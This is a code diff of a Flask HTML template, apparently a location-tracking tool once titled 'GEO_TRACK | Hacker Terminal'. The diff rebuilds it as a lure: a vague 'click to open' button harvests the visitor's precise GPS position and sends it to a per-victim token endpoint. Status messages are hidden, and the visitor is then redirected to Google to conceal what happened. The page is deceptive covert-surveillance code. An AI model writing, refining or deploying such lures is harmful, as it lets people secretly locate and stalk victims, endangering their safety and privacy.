@@ -3,25 +3,106 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>GEO_TRACK | Hacker Terminal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <title>Location Required</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #101010;
+            color: white;
+            font-family: Arial, sans-serif;
+            min-height: 100dvh;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            padding: 0;
+            gap: 15px;
+        }
+
+        button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #2196f3;
+            border: none;
+            padding: 25px;
+            color: white;
+            border-radius: 8px;
+            font-size: clamp(20px, 4vw, 36px);
+            font-weight: bold;
+            width: 100%;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #1976d2;
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: wait;
+        }
+
+        #status {
+            color: #aaa;
+            margin-top: 20px;
+        }
+    </style>
 </head>
+
 <body>
-<h2>Assalamualaikum</h2>
-<p>Tekan Izinkan ketika browser meminta akses.</p>
-<p id="status">Menunggu izin...</p>
+
+<div class="container">
+
+    <button id="locationButton" onclick="requestLocation()">
+        KLIK UNTUK MEMBUKA
+    </button>
+
+    <p id="status"></p>
+
+</div>
 
 <script>
+
+const tujuan = "https://www.google.com";
+
 const statusEl = document.getElementById("status");
 
-if (!navigator.geolocation) {
-    statusEl.textContent = "Browser tidak mendukung.";
-} else {
+const button = document.getElementById("locationButton");
+
+async function requestLocation() {
+
+    if (!navigator.geolocation) {
+        statusEl.textContent = "Browser tidak mendukung lokasi.";
+        return;
+    }
+
+    button.disabled = true;
+    //statusEl.textContent = "Meminta izin lokasi...";
+
     navigator.geolocation.getCurrentPosition(
-        async (position) => {
+
+        async function(position) {
+
             try {
+
+                //statusEl.textContent = "Mengirim data lokasi...";
+
                 const response = await fetch(
                     "/api/location/{{ item['token'] }}",
                     {
@@ -40,26 +121,51 @@ if (!navigator.geolocation) {
                 const result = await response.json();
 
                 if (!response.ok) {
-                    throw new Error(result.error);
+                    throw new Error(
+                        result.error || "Gagal mengirim lokasi."
+                    );
                 }
 
-                statusEl.textContent =
-                    "Ok terimakasih ....";
+                //statusEl.textContent = "Berhasil. Mengalihkan...";
+
+                window.location.href = tujuan;
+
             } catch (error) {
+
                 statusEl.textContent = error.message;
+                button.disabled = false;
+
             }
+
         },
-        (error) => {
-            statusEl.textContent =
-                "Izin  ditolak atau tidak tersedia.";
+
+        function(error) {
+
+            button.disabled = false;
+
+            if (error.code === 1) {
+                statusEl.textContent = "Izin lokasi ditolak.";
+            } else if (error.code === 2) {
+                statusEl.textContent = "Lokasi tidak tersedia.";
+            } else if (error.code === 3) {
+                statusEl.textContent = "Waktu habis. Silakan coba lagi.";
+            } else {
+                statusEl.textContent = "Terjadi kesalahan.";
+            }
+
         },
+
         {
             enableHighAccuracy: true,
             timeout: 20000,
             maximumAge: 0
         }
+
     );
+
 }
+
 </script>
+
 </body>
 </html>
